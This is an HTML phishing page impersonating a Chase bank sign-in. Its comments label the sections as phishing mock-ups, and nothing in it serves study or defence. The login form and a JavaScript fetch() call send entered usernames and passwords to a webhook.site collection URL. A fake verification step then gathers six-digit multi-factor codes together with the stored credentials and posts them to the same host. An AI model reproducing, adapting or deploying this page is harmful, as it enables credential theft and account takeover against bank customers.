<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bank Login</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f0f0f0;
    }
    /* Startup Page (Teaser) */
    .startup {
      height: 100vh;
      background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg==') no-repeat center center;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      text-align: center;
      font-size: 2rem;
    }
    /* Login Section (phish1.jpg) */
    .login-section {
      padding: 20px;
      background-color: white;
      max-width: 400px;
      margin: 0 auto;
      text-align: center;
    }
    .login-section h2 {
      color: #003087;
      font-size: 1.5rem;
      margin-bottom: 10px;
    }
    .login-section input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .login-section button {
      width: 100%;
      padding: 10px;
      background-color: #003087;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    .login-section button:hover {
      background-color: #002266;
    }
    /* Details Section (phish2.jpg) */
    .details-section {
      padding: 20px;
      background-color: #f0f0f0;
      text-align: left;
    }
    .details-section p {
      color: #333;
      font-size: 0.9rem;
      margin: 5px 0;
    }
    /* Code Page (Unique Post-Sign-In) */
    .code-section {
      display: none;
      padding: 20px;
      background-color: white;
      max-width: 400px;
      margin: 0 auto;
      text-align: center;
    }
    .code-section.active {
      display: block;
    }
    .code-section h2 {
      color: #006400;
      font-size: 1.5rem;
      margin-bottom: 10px;
    }
    .code-section p {
      color: #333;
      font-size: 1rem;
      margin-bottom: 10px;
    }
    .code-section input {
      width: 50px;
      height: 50px;
      margin: 5px;
      font-size: 1.5rem;
      text-align: center;
      border: 2px solid #006400;
      border-radius: 4px;
    }
  </style>
</head>
<body>
  <!-- Startup Teaser (Your Image) -->
  <div class="startup">Secure Login Ahead</div>

  <!-- Login Section (phish1.jpg) -->
  <div class="login-section">
    <h2>Sign In</h2>
    <form id="loginForm" action="https://webhook.site/YOUR_UNIQUE_ID" method="POST" onsubmit="showCodeSection(event)">
      <input type="hidden" name="bank" value="chase">
      <input type="text" name="username" placeholder="User ID" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Sign In</button>
    </form>
  </div>

  <!-- Details Section (phish2.jpg) -->
  <div class="details-section">
    <p>Protect your account with multi-factor authentication.</p>
    <p>Need help? Call 1-800-935-9935.</p>
    <p>Â© 2025 Chase Bank. All rights reserved.</p>
  </div>

  <!-- Code Section (Unique Post-Sign-In) -->
  <div class="code-section" id="codeSection">
    <h2>Verification Code</h2>
    <p>A 6-digit code has been sent to your phone. Enter it below:</p>
    <form id="codeForm" action="https://webhook.site/YOUR_UNIQUE_ID" method="POST">
      <input type="hidden" name="bank" value="chase">
      <input type="hidden" name="username" value="">
      <input type="hidden" name="password" value="">
      <input type="text" name="code1" maxlength="1" required>
      <input type="text" name="code2" maxlength="1" required>
      <input type="text" name="code3" maxlength="1" required>
      <input type="text" name="code4" maxlength="1" required>
      <input type="text" name="code5" maxlength="1" required>
      <input type="text" name="code6" maxlength="1" required>
      <button type="submit">Verify</button>
    </form>
  </div>

  <script>
    function showCodeSection(event) {
      event.preventDefault();
      const form = document.getElementById('loginForm');
      const codeSection = document.getElementById('codeSection');
      const codeForm = document.getElementById('codeForm');
      const formData = new FormData(form);
      codeForm.querySelector('[name="username"]').value = formData.get('username');
      codeForm.querySelector('[name="password"]').value = formData.get('password');
      codeSection.classList.add('active');
      formData.append('stage', 'login');
      fetch(form.action, {
        method: 'POST',
        body: formData
      });
    }
  </script>
</body>
</html>
